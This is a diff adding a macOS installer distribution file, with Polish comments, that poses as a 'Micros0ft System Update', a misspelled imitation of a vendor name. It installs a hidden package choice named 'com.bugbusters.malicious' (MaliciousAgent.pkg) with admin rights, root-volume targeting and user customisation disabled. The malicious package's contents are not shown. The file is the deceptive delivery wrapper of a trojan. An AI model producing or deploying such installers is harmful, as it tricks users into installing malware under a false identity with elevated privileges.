@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="utf-8"?>
+<installer-gui-script minSpecVersion="1">
+    <title>Micros0ft System Update</title>
+    <organization>com.bugbusters</organization>
+    <domains enable_localSystem="true"/>
+    <options customize="never" require-scripts="true" rootVolumeOnly="true"/>
+    
+    <!-- Wymagane uprawnienia administratora -->
+    <installation-check script="pm_install_check()"/>
+    
+    <script>
+    <![CDATA[
+    function pm_install_check() {
+        if(!(system.version.ProductVersion >= '10.9')) {
+            my.result.title = 'Wymagany macOS 10.9 lub nowszy';
+            my.result.message = 'Ten pakiet wymaga macOS 10.9 lub nowszej wersji.';
+            my.result.type = 'Fatal';
+            return false;
+        }
+        return true;
+    }
+    ]]>
+    </script>
+    
+    <!-- Definicja pakietu -->
+    <pkg-ref id="com.bugbusters.malicious"/>
+    
+    <options customize="never" require-scripts="true"/>
+    
+    <choices-outline>
+        <line choice="com.bugbusters.malicious"/>
+    </choices-outline>
+    
+    <choice id="com.bugbusters.malicious" visible="false">
+        <pkg-ref id="com.bugbusters.malicious"/>
+    </choice>
+    
+    <pkg-ref id="com.bugbusters.malicious" version="1.0" onConclusion="none">MaliciousAgent.pkg</pkg-ref>
+    
+    <!-- Teksty wyświetlane użytkownikowi -->
+    <welcome file="welcome.html" mime-type="text/html"/>
+    <conclusion file="conclusion.html" mime-type="text/html"/>
+    
+</installer-gui-script>
+
